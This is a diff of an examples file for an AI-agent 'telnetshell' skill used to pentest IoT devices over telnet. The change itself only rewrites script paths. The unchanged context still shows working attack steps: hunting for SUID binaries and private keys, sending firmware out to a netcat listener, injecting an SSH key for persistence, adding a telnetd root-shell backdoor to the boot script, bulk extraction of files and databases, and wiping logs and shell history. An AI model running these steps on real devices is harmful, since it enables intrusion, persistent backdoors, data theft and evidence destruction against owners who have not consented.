@@ -21,7 +21,7 @@ This document provides practical, real-world examples of using the telnetshell s
 
 ```bash
 # Quick system check
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --command "uname -a"
@@ -34,7 +34,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # Identify BusyBox version and available applets
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --command "busybox | head -5"
@@ -52,7 +52,7 @@ df -h
 EOF
 
 # Run it
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --script quick_check.txt
@@ -73,31 +73,31 @@ OUTPUT_DIR="./enum_results"
 mkdir -p "$OUTPUT_DIR"
 
 # System info
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host "$DEVICE" \
   --port "$PORT" \
-  --script .claude/skills/telnetshell/enum_system.txt \
+  --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_system.txt \
   --json > "$OUTPUT_DIR/system.json"
 
 # Network info
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host "$DEVICE" \
   --port "$PORT" \
-  --script .claude/skills/telnetshell/enum_network.txt \
+  --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_network.txt \
   --json > "$OUTPUT_DIR/network.json"
 
 # File system
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host "$DEVICE" \
   --port "$PORT" \
-  --script .claude/skills/telnetshell/enum_files.txt \
+  --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_files.txt \
   --json > "$OUTPUT_DIR/files.json"
 
 # Security
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host "$DEVICE" \
   --port "$PORT" \
-  --script .claude/skills/telnetshell/enum_security.txt \
+  --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_security.txt \
   --json > "$OUTPUT_DIR/security.json"
 
 echo "Enumeration complete. Results saved to $OUTPUT_DIR/"
@@ -112,7 +112,7 @@ cat > full_enum.sh <<'EOF'
 
 DEVICE="$1"
 PORT="${2:-2222}"
-HELPER="python3 .claude/skills/telnetshell/telnet_helper.py"
+HELPER="python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py"
 
 echo "========================================="
 echo "IoT Device Enumeration Report"
@@ -159,7 +159,7 @@ chmod +x full_enum.sh
 
 ```bash
 # Search for SUID binaries (privilege escalation vectors)
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 10 \
@@ -179,7 +179,7 @@ find / -name "*.key" 2>/dev/null
 find / -name "*.pem" 2>/dev/null
 EOF
 
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 15 \
@@ -190,7 +190,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # Find world-writable files and directories
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 20 \
@@ -205,7 +205,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # Check MTD partitions (common on IoT devices)
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --command "cat /proc/mtd"
@@ -224,7 +224,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 nc -lvp 4444 > firmware.bin
 
 # On target device via telnet:
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 30 \
@@ -235,7 +235,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # Start HTTP server on device
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --command "cd /tmp && busybox httpd -p 8000"
@@ -254,7 +254,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 # Add your public key for persistent access
 YOUR_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@host"
 
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --interactive <<EOF
@@ -275,7 +275,7 @@ echo "telnetd -l /bin/sh -p 9999 &" >> /etc/init.d/rcS
 cat /etc/init.d/rcS
 EOF
 
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --script add_backdoor.txt
@@ -289,7 +289,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # Get all listening services
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --command "netstat -tulpn" --json | \
@@ -307,7 +307,7 @@ ping -c 1 192.168.1.254
 for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i && echo "Host 192.168.1.$i is up"; done
 EOF
 
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 300 \
@@ -334,7 +334,7 @@ FILES=(
 
 for file in "${FILES[@]}"; do
   echo "Extracting: $file"
-  python3 .claude/skills/telnetshell/telnet_helper.py \
+  python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
     --host "$DEVICE" \
     --port "$PORT" \
     --command "cat $file" > "./extracted$(echo $file | tr '/' '_')"
@@ -345,14 +345,14 @@ done
 
 ```bash
 # Find and extract databases
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 30 \
   --command "find / -name '*.db' -o -name '*.sqlite' 2>/dev/null" | \
 while read dbfile; do
   echo "Found: $dbfile"
-  python3 .claude/skills/telnetshell/telnet_helper.py \
+  python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
     --host 192.168.1.100 \
     --port 2222 \
     --command "cat $dbfile" > "./$(basename $dbfile)"
@@ -367,7 +367,7 @@ done
 
 ```bash
 # Drop into interactive shell for manual exploration
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --logfile /tmp/manual_session.log \
@@ -387,7 +387,7 @@ rm -f /var/log/*
 history -c
 EOF
 
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --script cleanup.txt
@@ -402,7 +402,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 DEVICE="$1"
 PORT="${2:-2222}"
 REPORT_DIR="./pentest_$(date +%Y%m%d_%H%M%S)"
-HELPER="python3 .claude/skills/telnetshell/telnet_helper.py"
+HELPER="python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py"
 
 mkdir -p "$REPORT_DIR"
 
@@ -411,17 +411,17 @@ echo "[+] Report directory: $REPORT_DIR"
 
 # Phase 1: Reconnaissance
 echo "[1/5] Reconnaissance..."
-$HELPER --host "$DEVICE" --port "$PORT" --script .claude/skills/telnetshell/enum_system.txt > "$REPORT_DIR/01_system.txt"
-$HELPER --host "$DEVICE" --port "$PORT" --script .claude/skills/telnetshell/enum_network.txt > "$REPORT_DIR/02_network.txt"
+$HELPER --host "$DEVICE" --port "$PORT" --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_system.txt > "$REPORT_DIR/01_system.txt"
+$HELPER --host "$DEVICE" --port "$PORT" --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_network.txt > "$REPORT_DIR/02_network.txt"
 
 # Phase 2: Enumeration
 echo "[2/5] Enumeration..."
-$HELPER --host "$DEVICE" --port "$PORT" --script .claude/skills/telnetshell/enum_files.txt > "$REPORT_DIR/03_files.txt"
+$HELPER --host "$DEVICE" --port "$PORT" --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_files.txt > "$REPORT_DIR/03_files.txt"
 $HELPER --host "$DEVICE" --port "$PORT" --command "ps aux" > "$REPORT_DIR/04_processes.txt"
 
 # Phase 3: Security Assessment
 echo "[3/5] Security Assessment..."
-$HELPER --host "$DEVICE" --port "$PORT" --script .claude/skills/telnetshell/enum_security.txt > "$REPORT_DIR/05_security.txt"
+$HELPER --host "$DEVICE" --port "$PORT" --script ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/enum_security.txt > "$REPORT_DIR/05_security.txt"
 $HELPER --host "$DEVICE" --port "$PORT" --timeout 30 --command "find / -perm -4000 2>/dev/null" > "$REPORT_DIR/06_suid.txt"
 
 # Phase 4: Firmware Analysis
@@ -487,7 +487,7 @@ chmod +x complete_pentest.sh
 
 ```bash
 # If a command is timing out, increase the timeout
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --timeout 30 \
@@ -498,7 +498,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # If output is being filtered incorrectly, specify custom prompt
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --prompt "^MyDevice>\s*$" \
@@ -509,7 +509,7 @@ python3 .claude/skills/telnetshell/telnet_helper.py \
 
 ```bash
 # Use --debug and --raw to see exactly what's happening
-python3 .claude/skills/telnetshell/telnet_helper.py \
+python3 ${CLAUDE_PLUGIN_ROOT}/skills/telnetshell/telnet_helper.py \
   --host 192.168.1.100 \
   --port 2222 \
   --command "ls /" \
